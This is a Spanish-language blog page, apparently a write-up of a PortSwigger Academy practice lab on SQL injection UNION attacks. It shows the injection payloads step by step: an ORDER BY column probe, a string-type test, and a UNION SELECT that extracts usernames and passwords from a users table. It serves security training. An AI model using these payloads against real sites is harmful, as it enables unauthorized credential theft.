@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="es-GT">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Lab: SQL injection UNION attack, retrieving data from other tables'><title>Portswigger Academy Learning Path: SQL Injection Lab 5</title>
+
+<link rel='canonical' href='https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Portswigger Academy Learning Path: SQL Injection Lab 5'>
+<meta property='og:description' content='Lab: SQL injection UNION attack, retrieving data from other tables'>
+<meta property='og:url' content='https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/'>
+<meta property='og:site_name' content='A1ux'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='sqli' /><meta property='article:tag' content='portswigger' /><meta property='article:tag' content='academy' /><meta property='article:tag' content='burpsuite' /><meta property='article:published_time' content='2021-11-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-11-04T00:00:00&#43;00:00'/><meta property='og:image' content='https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/head.png' />
+<meta name="twitter:title" content="Portswigger Academy Learning Path: SQL Injection Lab 5">
+<meta name="twitter:description" content="Lab: SQL injection UNION attack, retrieving data from other tables"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/head.png' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Volver</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/portswigger-academy-learning-path-sql-injection-lab-5/">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-5/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_800x0_resize_box_3.png"
+                        srcset="/p/portswigger-academy-learning-path-sql-injection-lab-5/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_800x0_resize_box_3.png 800w, /p/portswigger-academy-learning-path-sql-injection-lab-5/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="402" 
+                        loading="lazy"
+                        alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 5" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pentest-web/" >
+                pentest web
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/portswigger-academy-learning-path-sql-injection-lab-5/">Portswigger Academy Learning Path: SQL Injection Lab 5</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Lab: SQL injection UNION attack, retrieving data from other tables
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 04, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    1 minuto a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="lab-lab-sql-injection-union-attack-retrieving-data-from-other-tables">Lab: Lab: SQL injection UNION attack, retrieving data from other tables</h1>
+<p>En este <!-- raw HTML omitted -->laboratorio<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted -->la finalidad es poder extraer los datos de una tabla, las columnas son <code>username</code> y <code>password</code> de la tabla <code>users</code>. La idea es hacer uso del metodo union en sql para poder extraer esos datos aparte de los que ya trae el sistema. La consulta comun para recuperar estos datos seria:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
+</span></code></pre></div><h2 id="reconocimiento">Reconocimiento</h2>
+<p>Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.</p>
+<h3 id="payloads">Payloads</h3>
+<h4 id="recuperar-columnas">Recuperar columnas</h4>
+<p>Recuperamos las columnas inyectando la siguiente consulta:</p>
+<pre tabindex="0"><code>https://xxxxxxxxxxxx.web-security-academy.net/filter?category=PetsPets' order by 4--
+</code></pre><h4 id="recuperar-tipo-de-datos">Recuperar tipo de datos</h4>
+<p>Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">Pets</span><span class="s1">&#39; union select &#39;</span><span class="n">test</span><span class="s1">&#39;,&#39;</span><span class="n">test</span><span class="s1">&#39;--
+</span></code></pre></div><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 100; 
+			flex-basis: 241px"
+	>
+	<a href="/p/portswigger-academy-learning-path-sql-injection-lab-5/strings.png" data-size="1781x1773">
+		<img src="/p/portswigger-academy-learning-path-sql-injection-lab-5/strings.png"
+			width="1781"
+			height="1773"
+			srcset="/p/portswigger-academy-learning-path-sql-injection-lab-5/strings_hub14488023fc5142b8e0617dac40dcbeb_519418_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-sql-injection-lab-5/strings_hub14488023fc5142b8e0617dac40dcbeb_519418_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="Tipo de Datos aceptados">
+	</a>
+	
+	<figcaption>Tipo de Datos aceptados</figcaption>
+	
+</figure></p>
+<h4 id="recuperar-datos-de-usuarios">Recuperar datos de usuarios</h4>
+<p>Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos la siguiente consulta:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">Pets</span><span class="s1">&#39; union select username,password from users--
+</span></code></pre></div><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 100; 
+			flex-basis: 240px"
+	>
+	<a href="/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido.png" data-size="1744x1742">
+		<img src="/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido.png"
+			width="1744"
+			height="1742"
+			srcset="/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido_hu27c916cebc82f9da26fc034f1f8e70b9_529545_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-sql-injection-lab-5/extraido_hu27c916cebc82f9da26fc034f1f8e70b9_529545_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="Usuarios y Contrasenas de la tabla users">
+	</a>
+	
+	<figcaption>Usuarios y Contrasenas de la tabla users</figcaption>
+	
+</figure></p>
+<p>Ahora que ya nos hicimos con los datos del administrador, podemos iniciar sesion para que el sistema ya nos tome como resuelto el lab.</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 207; 
+			flex-basis: 497px"
+	>
+	<a href="/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto.png" data-size="1786x862">
+		<img src="/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto.png"
+			width="1786"
+			height="862"
+			srcset="/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto_hu8619a3f0e8c32341800ab4c4e3a758b5_98522_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto_hu8619a3f0e8c32341800ab4c4e3a758b5_98522_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="Laboratorio resuelto">
+	</a>
+	
+	<figcaption>Laboratorio resuelto</figcaption>
+	
+</figure></p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p><a class="link" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables"  target="_blank" rel="noopener"
+    >Laboratorio</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sqli/">sqli</a>
+        
+            <a href="/tags/portswigger/">portswigger</a>
+        
+            <a href="/tags/academy/">academy</a>
+        
+            <a href="/tags/burpsuite/">burpsuite</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Contenidos relacionados</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-3/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-3/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 3</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-4/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-4/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 4</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-2/headlab2.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 2</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-1/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 1</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2021 A1ux
+    </section>
+    
+    <section class="powerby">
+        
+
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Tabla de contenido</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#reconocimiento">Reconocimiento</a>
+      <ol>
+        <li><a href="#payloads">Payloads</a>
+          <ol>
+            <li><a href="#recuperar-columnas">Recuperar columnas</a></li>
+            <li><a href="#recuperar-tipo-de-datos">Recuperar tipo de datos</a></li>
+            <li><a href="#recuperar-datos-de-usuarios">Recuperar datos de usuarios</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
